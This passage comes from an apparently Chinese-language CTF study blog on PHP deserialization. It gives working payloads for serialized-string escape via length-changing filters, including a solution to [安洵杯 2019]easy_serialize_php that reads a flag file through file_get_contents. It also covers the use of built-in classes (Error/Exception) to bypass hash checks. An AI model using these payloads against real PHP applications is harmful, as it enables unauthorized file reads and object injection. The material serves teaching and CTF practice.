class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure></li><li><p>正则</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#11位数字</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#xxx@xxx.xxx xxx限制[_a-zA-Z0-9]</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#长度&lt;=10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>需要绕过nickname的正则，用数组绕过即可。</p></li></ol><p>需要逃逸的变量为<code>$photo=&#39;config.php&#39;</code>，目标子串为<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，共33个字符，一个where在替换后长度加1，所以需要33个where。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;734541725@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;sadasd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化后：&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">320</span>) <span class="string">&quot;a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">过滤后:a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;</span><br><span class="line">反序列化后：E:\浏览器下载\chrome\新建文件夹\<span class="number">2</span>.php:<span class="number">21</span>:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;phone&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;12345678901&quot;</span></span><br><span class="line">  <span class="string">&#x27;email&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;734541725@qq.com&quot;</span></span><br><span class="line">  <span class="string">&#x27;nickname&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">198</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  <span class="string">&#x27;photo&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还要注意的点就是因为要绕过正则，所以nickname→nickname[]，数组序列化后就需要闭合{，所以</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>34个where，并且需要手动添加一个}来闭合多出的{</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[]=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;a:1:&#123;i:0;a:1:&#123;i:0;i:1;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221004202925741.png" alt="image-20221004202925741" style="zoom: 50%;" /><h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路：过滤后字符减少，会吃掉后面的字符，所以需要计算过滤处到目标子串的长度</span><br><span class="line">见下面例子，因为这种情况需要观察序列化字符串才能得到过滤处到目标子串的长度，而不是像过滤后字符变多那样可以直接构造。</span><br></pre></td></tr></table></figure><h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><p>过滤函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可控变量</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">还有一个<span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>]是需要我们覆盖的变量</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>序列化→过滤→反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>目标子串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(d0g3_f1ag.php)=<span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span></span><br><span class="line"><span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>观察序列化字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//过滤后字符减少3或者4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//不可控变量，固定值base64_encode(&#x27;guest_img.png&#x27;)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;过滤前:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;</span><br><span class="line">过滤前:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">过滤后:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:4:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">需要计算过滤处到目标子串的长度：&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot; 长度为23，不为3或4的倍数，最接近的是24，所以在</span></span><br><span class="line"><span class="string">目标子串头添加任意一个字符变成a&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">所以过滤后会吃掉<span class="number">24</span>个字符，所以可以选择<span class="number">4</span>*<span class="number">6</span>或者<span class="number">3</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//过滤后字符减少</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;<span class="comment">//过滤后向后吃24个字符，或者php*8</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;khaz&quot;;s:4:&quot;haha&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//不可控变量，固定值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;过滤前:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">过滤前:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">过滤后:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">E:\xampp2\php\www\2.php:19:</span></span><br><span class="line"><span class="string">array(3) &#123;</span></span><br><span class="line"><span class="string">  &#x27;user&#x27; =&gt;</span></span><br><span class="line"><span class="string">  string(24) &quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="string">&#x27;img&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span></span><br><span class="line">  <span class="string">&#x27;khaz&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;添加了这个是因为<span class="variable">$_SESSION</span>有三个值(a:<span class="number">3</span>),数量要对的上才能反序列化</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h1><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br></pre></td></tr></table></figure><h2 id="获取指定方法的原生类"><a href="#获取指定方法的原生类" class="headerlink" title="获取指定方法的原生类"></a>获取指定方法的原生类</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>(); <span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>); <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>( <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__toString&#x27;</span>, <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__callStatic&#x27;</span>, <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__unset&#x27;</span>, <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</p><p>比如说题目给的代码有MD5，eval等，这些函数的参数都是字符串类型，所以可以触发<code>__tostring</code>魔术方法</p></blockquote><h2 id="Error-x2F-Exception-类"><a href="#Error-x2F-Exception-类" class="headerlink" title="Error&#x2F;Exception 类"></a>Error&#x2F;Exception 类</h2><blockquote><p>用于自定义错误类型的</p></blockquote><table><thead><tr><th align="center">类</th><th align="center">适用版本</th><th align="center">属性（一样的）</th></tr></thead><tbody><tr><td align="center">Error</td><td align="center">php7</td><td align="center">message：异常消息内容                                                           file：抛出异常的文件名</td></tr><tr><td align="center">Exception</td><td align="center">php5&#x2F;php7</td><td align="center">line：抛出异常在该文件中的行号                                         code：异常代码</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">3</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure><p>仔细观察会发现只有异常代码code没有被输出，并且只有行号line不同</p><p>利用</p><blockquote><p>可用来绕过类属性的哈希比较</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;相同&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不相同&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807151831343.png" 